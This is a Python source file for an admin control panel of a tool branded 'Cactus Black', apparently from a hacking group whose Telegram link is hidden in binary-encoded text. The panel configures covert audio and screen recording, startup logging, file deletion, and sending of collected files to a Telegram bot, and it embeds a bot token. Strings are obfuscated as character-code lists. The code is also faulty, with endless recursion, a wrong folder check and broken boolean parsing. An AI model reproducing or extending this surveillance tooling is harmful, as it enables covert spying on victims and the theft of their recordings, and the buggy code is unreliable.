import pygame_menu
import pygame_menu.font
import pygame_menu.themes as themes
import os
import pygame
from tkinter import Tk, Button, Label
from tkinter.filedialog import askdirectory
import json

def Install_Program():
    if "LOG_Program_Cactus_Black" not in os.listdir("C:/") :
        os.mkdir("C:/LOG_Program_Cactus_Black")
    else:
        if "Setting.Cactus_Black" not in os.listdir("C:/LOG_Program_Cactus_Black/") :
            Load_Data_Setting()
        if "Install.ini" not in os.listdir("C:/LOG_Program_Cactus_Black/") :
            Install = open("C:/LOG_Program_Cactus_Black/Install.ini", "w")
            Install.write("01000011 01110010 01100101 01100001 01110100 01101001 01101110 01100111 00100000 01110111 01101000 01101001 01110100 00100000 01000011 01100001 01100011 01110100 01110101 01110011 00100000 01000010 01101100 01100001 01100011 01101011 00100000 01000111 01110010 01110101 01110000 00001010 01101000 01110100 01110100 01110000 01110011 00111010 00101111 00101111 01110100 00101110 01101101 01100101 00101111 01000111 01110010 01110101 01110000 01011111 01001000 01100001 01100011 01101011 01101001 01101110 01100111 01011111 01000011 01100001 01100011 01110100 01110101 01110011 01011111 01000010 01101100 01100001 01100011 01101011")
        if "License.ini" not in os.listdir("C:/LOG_Program_Cactus_Black/") :
            License = open("C:/LOG_Program_Cactus_Black/License.ini", "w")
            License.write("01000011 01110010 01100101 01100001 01110100 01101001 01101110 01100111 00100000 01110111 01101000 01101001 01110100 00100000 01000011 01100001 01100011 01110100 01110101 01110011 00100000 01000010 01101100 01100001 01100011 01101011 00100000 01000111 01110010 01110101 01110000 00001010 01101000 01110100 01110100 01110000 01110011 00111010 00101111 00101111 01110100 00101110 01101101 01100101 00101111 01000111 01110010 01110101 01110000 01011111 01001000 01100001 01100011 01101011 01101001 01101110 01100111 01011111 01000011 01100001 01100011 01110100 01110101 01110011 01011111 01000010 01101100 01100001 01100011 01101011")
        if "TimeLog.Cactus_Black" not in os.listdir("C:/LOG_Program_Cactus_Black/") :
            TimeLog = open("C:/LOG_Program_Cactus_Black/TimeLog.Cactus_Black", "w")
        if "ErrorLog.Cactus_Black" not in os.listdir("C:/LOG_Program_Cactus_Black/") :
            ErrorLog = open("C:/LOG_Program_Cactus_Black/ErrorLog.Cactus_Black", "w")
        if "DataBase.Cactus_Black" not in os.listdir("C:/LOG_Program_Cactus_Black/") :
            DataBase = open("C:/LOG_Program_Cactus_Black/DataBase.Cactus_Black", "w")
            DataBase.write("01000011 01110010 01100101 01100001 01110100 01101001 01101110 01100111 00100000 01110111 01101000 01101001 01110100 00100000 01000011 01100001 01100011 01110100 01110101 01110011 00100000 01000010 01101100 01100001 01100011 01101011 00100000 01000111 01110010 01110101 01110000 00001010 01101000 01110100 01110100 01110000 01110011 00111010 00101111 00101111 01110100 00101110 01101101 01100101 00101111 01000111 01110010 01110101 01110000 01011111 01001000 01100001 01100011 01101011 01101001 01101110 01100111 01011111 01000011 01100001 01100011 01110100 01110101 01110011 01011111 01000010 01101100 01100001 01100011 01101011")
        if "ScreenRecords" not in os.listdir("C:/LOG_Program_Cactus_Black/"):
            os.mkdir("C:/LOG_Program_Cactus_Black/AudiuRecords")
        if "AudiuRecords" not in os.listdir("C:/LOG_Program_Cactus_Black/"):
            os.mkdir("C:/LOG_Program_Cactus_Black/AudiuRecords")
        Install.close()
        License.close()
        TimeLog.close()
        ErrorLog.close()
        DataBase.close()
        Install_Program()
    Install_Program()

Install_Program()

def get_folder_size(folder_path):
    total_size = 0
    for dirpath, dirnames, filenames in os.walk(folder_path):
        for f in filenames:
            fp = os.path.join(dirpath, f)
            total_size += os.path.getsize(fp)
    return round(total_size / (1024 ** 3), 3)

def select_folder():
    global Directory_SIZE_NOT_UI,Directory_SIZE
    folder_selected = askdirectory(initialdir="C:/LOG_Program_Cactus_Black" ,title="Panel Admin - Cactus Black => Set Folder Save Data")
    if folder_selected:
        size_gb = get_folder_size(folder_selected)
        Directory_SIZE_NOT_UI = size_gb
        Directory_SIZE = str(Directory_SIZE_NOT_UI)+" GB"
        SIZE_TEXT.set_title("Size Folder Data : "+Directory_SIZE)
        Set("Folder", "Dir", folder_selected)

Directory_Address = "C:/LOG_Program_Cactus_Black"
Directory_SIZE_NOT_UI = get_folder_size(Directory_Address)
Directory_SIZE = str(Directory_SIZE_NOT_UI)+" GB"

text = "Check Login Windows - Panel Admin -> Cactus Black"
# Initialize Pygame
pygame.init()
surface = pygame.display.set_mode((389, 635))
text = ''.join([chr(Cactus2025) for Cactus2025 in [67, 101, 99, 107, 95, 76,
32, 103, 105, 110, 95, 87, 105, 110, 100, 111, 119, 115, 32, 45, 32, 80, 97,
 110, 101, 108, 32, 65, 100, 109, 105, 110, 32, 45, 62, 32, 67, 97, 99, 116,
 117, 115, 32, 66, 108, 97, 99, 107]])
pygame.display.set_caption(text)

# Create Menu
menu = pygame_menu.Menu(
    title="Control Panel",
    width=pygame.display.get_window_size()[0],
    height=pygame.display.get_window_size()[1],
    theme=themes.THEME_DARK
)
# Change UI theme
themes.THEME_DARK.background_color = (30, 30, 40) # Dark background
themes.THEME_DARK.title_font_color = (255, 255, 255) # White text for title
themes.THEME_DARK.widget_font_color = (200, 200, 200) # Light grey text for widgets
themes.THEME_DARK.selection_color = (100, 150, 200) # Blue colour for selection
themes.THEME_DARK.border_color = (50, 50, 60) # Dark border
themes.THEME_DARK.widget_font = pygame_menu.font.FONT_COMIC_NEUE
themes.THEME_DARK.widget_font_shadow = True
themes.THEME_DARK.title_font_size = 18
themes.THEME_DARK.widget_font_size = 20
themes.THEME_DARK.widget_font_shadow = True

def toggle_input(INPUTS:list):
    for input_ in INPUTS :
        if input_.is_visible():
            input_.hide()
        else:
            input_.show()

def Load_Data_Setting(ret = "str"):
    global DefaultSetting
    DefaultSetting = {
        "Audiu" : {
            "Ra" : "True",
            "TRa" : "180",
        },
        "screen" : {
            "Rs" : "True",
            "TRs" : "180",
        },
        "startup" : {
            "Ls" : "True",
        },
        "Delete" : {
            "De" : "True",
        },
        "TelBot" : {
            "Tb" : "False",
            "ID" : "1234567890",
            "API": "1234567890:AAHYdFETSH5JKduIUfrLzqffdsGMkJl_0G0"
        },
        "Folder" : {
            "Dir":"C:/LOG_Program_Cactus_Black",
        }
    }
    try:
        file_Setting = open(''.join([chr(value) for value in [67,
            58, 47, 76, 79, 71, 95, 80, 114, 111, 103, 114, 97, 109, 95,
            67, 97, 99, 116, 117, 115, 95, 66, 108, 97, 99, 107, 47, 83,
            101, 116, 116, 105, 110, 103, 46, 67, 97, 99, 116, 117, 115,
            95, 66, 108, 97, 99, 107]]),"r")
    except:
        file_Setting = open(''.join([chr(value) for value in [67,
            58, 47, 76, 79, 71, 95, 80, 114, 111, 103, 114, 97, 109, 95,
            67, 97, 99, 116, 117, 115, 95, 66, 108, 97, 99, 107, 47, 83,
            101, 116, 116, 105, 110, 103, 46, 67, 97, 99, 116, 117, 115,
            95, 66, 108, 97, 99, 107]]),"w")
        json.dump(DefaultSetting, file_Setting, indent=4)
        file_Setting.close()
        file_Setting = open(''.join([chr(value) for value in [67,
            58, 47, 76, 79, 71, 95, 80, 114, 111, 103, 114, 97, 109, 95,
            67, 97, 99, 116, 117, 115, 95, 66, 108, 97, 99, 107, 47, 83,
            101, 116, 116, 105, 110, 103, 46, 67, 97, 99, 116, 117, 115,
            95, 66, 108, 97, 99, 107]]),"r")
    if ret == "str" :
        return file_Setting.read()
    elif ret == "List":
        return json.loads(file_Setting.read())

def SetValueToSetting(Root, Name, Value, SettingNow):
    file_Setting_New = open(''.join([chr(value) for value in [67, 58,
        47, 76, 79, 71, 95, 80, 114, 111, 103, 114, 97, 109, 95, 67, 97, 99, 116,
        117, 115, 95, 66, 108, 97, 99, 107, 47, 83, 101, 116, 116, 105, 110, 103,
        95, 78, 101, 119, 46, 67, 97, 99, 116, 117, 115, 95, 66, 108, 97, 99, 107]]),"w")
    settings = json.loads(SettingNow)
    # Update the value
    settings[Root][Name] = Value
    json.dump(settings, file_Setting_New, indent=4)

def Set(root, Name, Value):
    SetValueToSetting(root, Name, Value, Load_Data_Setting())

def save(Exit):
    # Delete the old file if it exists
    if (os.path.exists('C:/LOG_Program_Cactus_Black/Setting_New.Cactus_Black') and
    os.path.exists('C:/LOG_Program_Cactus_Black/Setting.Cactus_Black')) :
        # Remove Back File
        os.remove('C:/LOG_Program_Cactus_Black/Setting.Cactus_Black')
        # Rename the new file to the old file's name
        os.rename('C:/LOG_Program_Cactus_Black/Setting_New.Cactus_Black', 'C:/LOG_Program_Cactus_Black/Setting.Cactus_Black')
        if Exit : exit()
    else:
        exit()

# Add Elements to Menu
# Audio recording settings
Record_audio = menu.add.toggle_switch("Record audio",
    default=bool(Load_Data_Setting("List")["Audiu"]["Ra"]), onchange=lambda value: [Set("Audiu", "Ra", value), toggle_input([Ra_T, Ra_S])],
    width=80,background_color=(170,180,190)).translate(-10, 0)
# Recording time
Ra_T = menu.add.label("Change recording time (in seconds): ",background_color=(170,180,190))
Ra_S = Record_audio_Time = menu.add.range_slider("", default=int(Load_Data_Setting("List")["Audiu"]["TRa"]), range_values=(0, 1000),
    increment=1, onchange=lambda value: Set("Audiu", "TRa", str(value)))
# Screen recording settings
Record_screen = menu.add.toggle_switch("Record screen",
    default=bool(Load_Data_Setting("List")["screen"]["Rs"]), onchange=lambda value: [Set("screen", "Rs",value), toggle_input([Rs_T, Rs_S])],
    width=80,background_color=(170,180,190)).translate(-10, 0)
# Recording time
Rs_T = menu.add.label("Change recording time (in seconds): ",background_color=(170,180,190))
Rs_S = Record_screen_Time = menu.add.range_slider("", default=int(Load_Data_Setting("List")["screen"]["TRs"]), range_values=(0, 1000),
increment=1, onchange=lambda value: Set("screen", "TRs", str(value)))
# Log system startup time
Log_startup_time = menu.add.toggle_switch("Log startup time",
    default=bool(Load_Data_Setting("List")["startup"]["Ls"]), onchange=lambda value: Set("startup", "Ls", value),
    width=80,background_color=(170,180,190)).translate(-10, 0)
# Delete extra files and system cache on startup
D_extra_files = menu.add.toggle_switch("Delete extra files",
    default=bool(Load_Data_Setting("List")["Delete"]["De"]), onchange=lambda value: Set("Delete", "De", value),
    width=80,background_color=(170,180,190)).translate(-10, 0)
# Send files to Telegram bot
Record_audio = menu.add.toggle_switch("Send to Telegram bot",
    default=bool(Load_Data_Setting("List")["TelBot"]["Tb"]),onchange=lambda value: toggle_input([TOKEN_BOT,TOKEN_BOT_Title,Chat_Id,Chat_Id_Title]),
    width=80,background_color=(170,180,190)).translate(-10, 0)
# Telegram bot token and chat ID for sending files
TOKEN_BOT_Title = menu.add.label("Token Bot :",background_color=(170,180,190))
TOKEN_BOT = menu.add.text_input("", default=Load_Data_Setting("List")["TelBot"]["API"],background_color=(170,180,190))
Chat_Id_Title = menu.add.label("Chat Id :",background_color=(170,180,190))
Chat_Id =  menu.add.text_input("", default=Load_Data_Setting("List")["TelBot"]["ID"],background_color=(170,180,190))
# Change data location
menu.add.label("")
menu.add.label("")
ChangeLocation_B = menu.add.button("Change Location",lambda: select_folder(),background_color=(170,180,190)).translate(0,0)
# Display data size
menu.add.label("")
menu.add.label("")
SIZE_TEXT = menu.add.label("Size Folder Data : "+Directory_SIZE)
menu.add.label("")
# Create a horizontal frame for the last three buttons
button_frame = menu.add.frame_h(width=300, height=50, background_color=(50, 50, 60))
button_frame.pack(menu.add.button("Exit", lambda: pygame_menu.events.EXIT,background_color=(255,0,0)))
button_frame.pack(menu.add.button("Save & Exit", lambda: save(True),background_color=(0,255,0)))
button_frame.pack(menu.add.button("Apply", lambda: save(False),background_color=(0,255,0)))

toggle_input([TOKEN_BOT,TOKEN_BOT_Title,Chat_Id,Chat_Id_Title])
if bool(Load_Data_Setting("List")["Audiu"]["Ra"]) == False : toggle_input([Ra_T,Ra_S])
if bool(Load_Data_Setting("List")["screen"]["Rs"]) == False : toggle_input([Rs_T,Rs_S])
menu.mainloop(surface)
